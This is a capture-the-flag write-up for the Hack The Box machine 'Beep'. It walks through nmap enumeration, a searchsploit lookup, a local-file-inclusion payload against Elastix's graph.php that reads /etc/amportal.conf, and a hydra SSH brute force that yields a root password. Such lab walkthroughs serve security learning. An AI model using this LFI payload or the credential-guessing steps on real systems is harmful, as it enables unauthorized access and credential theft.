# Beep
### Info:

OS: Linux <br>
IP: 10.10.10.7 <br>
Difficulty : easy <br>
### <b>4 different ways to get this box:</b>
  1. LFI(local file inclusion) + password <br>
  2. LFI to RCE <br>
  3. PBX exploit (code exec via call)<br>
  4. Shellshock <br>
### Enumeration:

```nmap -sC -sV -oA nmap 10.10.10.7``` <br>

gives us the results : <br>

```
# Nmap 7.70 scan initiated Mon Jan  7 21:48:31 2019 as: nmap -sC -sV -oA nmap 10.10.10.7
Nmap scan report for 10.10.10.7
Host is up (0.73s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey:
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: AUTH-RESP-CODE IMPLEMENTATION(Cyrus POP3 server v2) USER RESP-CODES PIPELINING APOP TOP UIDL STLS EXPIRE(NE$
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1            743/udp  status
|_  100024  1            746/tcp  status
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: MULTIAPPEND Completed OK THREAD=ORDEREDSUBJECT THREAD=REFERENCES X-NETSCAPE URLAUTHA0001 CONDSTORE LISTEXT $
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Elastix - Login page
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryNam$
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_ssl-date: 2019-01-07T14:13:44+00:00; -2h07m46s from scanner time.
993/tcp   open  ssl/imap   Cyrus imapd
```
Running dirbuster on page http://10.10.10.7 with wordlists gave us some import subdomains such as <b> /admin, /help, /config </b> </br> 
Checking the admin page we get the Version of the FreePBX as `2.8.1.4` <br>
### Exploitation:
Searching with searchsploit gives us the result 
```
root@kali:~/Desktop/boxes/retired/Beep# searchsploit elastix
---------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                          |  Path
                                                                                        | (/usr/share/exploitdb/)
---------------------------------------------------------------------------------------- ----------------------------------------
Elastix - 'page' Cross-Site Scripting                                                   | exploits/php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulnerabilities                                 | exploits/php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                           | exploits/php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusion                                        | exploits/php/webapps/37637.pl
Elastix 2.x - Blind SQL Injection                                                       | exploits/php/webapps/36305.txt
Elastix < 2.5 - PHP Code Injection                                                      | exploits/php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                  | exploits/php/webapps/18650.py
---------------------------------------------------------------------------------------- ----------------------------------------
```
On examining with -x on `Elastix 2.2.0 - 'graph.php' Local File Inclusion` we get 
```
#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```
Running this gives a list of passwords and usernames and running it with hydra gives us the root credentials:
```
root@kali:~/Desktop/boxes/retired/Beep# hydra -L users -P pw ssh://10.10.10.7
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2019-01-09 01:18:23
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 28 login tries (l:7/p:4), ~2 tries per task
[DATA] attacking ssh://10.10.10.7:22/
[22][ssh] host: 10.10.10.7   login: root   password: jEhdIekWmdjE
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2019-01-09 01:18:52
```
### Things Learned :
Web Based fuzzing

Indentifying known exploits using searchsploit

Exploit local file inclusion vulns

